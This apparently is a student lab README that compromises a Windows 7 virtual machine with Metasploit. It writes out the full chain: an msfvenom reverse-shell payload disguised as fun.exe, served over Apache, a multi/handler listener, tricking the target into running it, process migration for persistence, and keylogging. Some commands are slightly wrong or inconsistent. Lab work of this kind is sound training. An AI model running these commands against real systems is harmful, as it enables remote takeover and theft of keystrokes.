# EX-6.Compromising-windows-using-Metasploit
## Date:06/04/2024
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/0f0a4214-f2dc-4996-8926-eb56392bcc9c)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/7556fc57-da46-4e95-8513-3751c39f7877)



copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/ef0ae3f2-ed72-4581-a5e3-082fc0c1c662)


Start apache server
sudo systemctl apache2 start

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/06567d9d-bf5a-46f3-8915-09e660fd0ee6)



Check the status of apache2
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/6ce0d347-84b4-4782-9e05-3684db0a972a)



Invoke msfconsole:
## OUTPUT:

![320249831-bcbf9308-5c23-49c0-8ece-39f45528f5f8](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/7ea33979-d8fd-44a3-af85-5eb17f520e28)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![320249999-1a4990af-3423-40c9-ac8d-e76ae65172ce](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/7782e729-27b3-4b25-9182-9f1ed5a34d68)

Starting a command and control Server

use multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

exploit

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/039dce90-c240-40e3-a053-479988b6de5a)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.

![VirtualBox_Windows 7_07_04_2024_09_28_16](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/6d0f5ccd-2d68-4896-807f-14936ab7dfc3)

Bypass any warning boxes, double-click the file, and allow it to run.

![VirtualBox_Windows 7_07_04_2024_09_56_55](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/0a74ac36-8755-414c-9030-2c5d9daba5d8)

On kali give the command exploit

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/e52ec7e8-339e-4c61-97d4-6ded61fa3868)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/2e397df3-935e-4231-9552-628e829a336d)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/b8ba91f2-ec16-43fd-b843-7a5720d84935)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.


![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/8347aaba-4690-4922-8388-33f496f36796)


keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/6e719e14-830f-4589-a9de-86ebbba28b65)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
